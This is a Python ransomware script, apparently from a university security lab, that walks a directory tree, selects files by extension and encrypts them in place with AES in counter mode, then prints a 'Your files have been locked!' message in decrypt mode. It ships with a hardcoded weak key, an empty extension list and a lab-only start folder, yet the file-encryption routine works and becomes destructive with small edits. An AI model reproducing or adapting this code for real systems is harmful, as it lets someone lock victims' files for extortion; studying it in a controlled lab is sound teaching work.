#!/usr/bin/env python
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
#  set to either: '128/192/256 bit plaintext key' or False
#  key length is 16/24/32 chars long
HARDCODED_KEY = b'veryweakpassword'



###########    READ BEFORE USING!   ################
# Usage
# Select the folder to run the ransomware
# go to discover.py and specify the file extensions to be encrypted
# run the main function [python ransomware.py]
# you can check the specified files are no longer available to access
# you can run the main function to decrypt [python ransomware.py -d]
# use the decryption key provided to decrypt
# please dont ruin your friends' computer using this




def discoverFiles(startpath):
    '''
    Goes through all of the contents from the :startpath and any subfolders 
    within and collects all the file information where the extensions are specified.
    '''
    # You can specify the file extensions you want to encrypt.
    # specify them as a string e.g., 'jpg', 'bmp'
    extensions = []

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path

def discoverFileChecker(path='/'):
    '''
    Checks that discoverFile function is working correctly.
    You can provide the path to a folder, it will search all of its subfolders
    and display the specified extensions.
    by default, it will search from the root folder.    
    '''
    x = discoverFiles(path)
    for i in x:
        print(i)


def modify_file_inplace(filename, crypto, blocksize=16):
    '''
    This function encrypts
    Open `filename` and encrypt/decrypt according to `crypto`

    :filename: a filename (preferably absolute path)
    :crypto: a stream cipher function that takes in a plaintext,
             and returns a ciphertext of identical length
    :blocksize: length of blocks to read and write.
    :return: None
    '''
    with open(filename, 'r+b') as f:
        plaintext = f.read(blocksize)

        while plaintext:
            ciphertext = crypto(plaintext)
            if len(plaintext) != len(ciphertext):
                raise ValueError('''Ciphertext({})is not of the same length of the Plaintext({}).
                Not a stream cipher.'''.format(len(ciphertext), len(plaintext)))

            f.seek(-len(plaintext), 1) # return to same point before the read
            f.write(ciphertext)

            plaintext = f.read(blocksize)
	    
	    

def get_parser():
    parser = argparse.ArgumentParser(description='ransomware exercise')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print ('''
Your files have been locked! Please use the below decryption key provided
to unlock your files.

Your decryption key is: '{}'

'''.format(HARDCODED_KEY.decode()))
        key = input('Enter Your Key> ')
        key = key.encode('utf-8')

    else:
        # In real ransomware, this part includes complicated key generation,
        # sending the key back to attackers and more
        if HARDCODED_KEY:
            key = HARDCODED_KEY
		
	# DON'T uncomment below, unless you really want to ruin your files
        # else:
        #     key = random(32)

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    # change this to fit your needs.
    startdirs = ['/home/seed/Labs/Lab10/Task2/Testing']
    for currentDir in startdirs:
        for file in discoverFiles(currentDir):
            modify_file_inplace(file, crypt.encrypt)

if __name__ == "__main__":
    main()
